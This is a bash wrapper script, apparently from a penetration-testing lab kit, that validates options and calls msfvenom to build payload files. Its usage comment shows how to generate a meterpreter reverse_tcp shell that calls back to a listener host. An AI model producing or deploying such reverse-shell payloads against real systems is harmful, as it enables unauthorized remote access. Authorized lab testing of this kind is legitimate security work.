#!/usr/bin/env bash
#
# 05-generate-payload.sh
# msfvenom wrapper for the payloads I end up generating over and over
# in the lab. Validates the basics before shelling out so a typo
# doesn't burn a minute compiling something useless.
#
# Usage: ./05-generate-payload.sh -p <payload> -l <LHOST> -r <LPORT> -f <format> -o <outfile>
# Example:
#   ./05-generate-payload.sh -p linux/x64/meterpreter/reverse_tcp \
#       -l 192.168.56.1 -r 4444 -f elf -o loot/shell.elf

set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")"
source lib/common.sh

usage() {
    echo "Usage: $0 -p <payload> -l <LHOST> -r <LPORT> -f <format> -o <outfile> [-e <encoder>]"
    exit 1
}

ENCODER=""
while getopts "p:l:r:f:o:e:h" opt; do
    case "$opt" in
        p) PAYLOAD="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        r) LPORT="$OPTARG" ;;
        f) FORMAT="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        e) ENCODER="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "${PAYLOAD:-}" || -z "${LHOST:-}" || -z "${LPORT:-}" || -z "${FORMAT:-}" || -z "${OUTFILE:-}" ]]; then
    usage
fi

require_cmd msfvenom

mkdir -p "$(dirname "$OUTFILE")"

CMD=(msfvenom -p "$PAYLOAD" "LHOST=${LHOST}" "LPORT=${LPORT}" -f "$FORMAT" -o "$OUTFILE")
if [[ -n "$ENCODER" ]]; then
    CMD+=(-e "$ENCODER")
fi

log_info "Generating payload: ${PAYLOAD} -> ${OUTFILE}"
"${CMD[@]}"

chmod +x "$OUTFILE" 2>/dev/null || true
log_info "Payload written to $OUTFILE"
log_warn "Remember: only deploy this against hosts you're authorized to test."
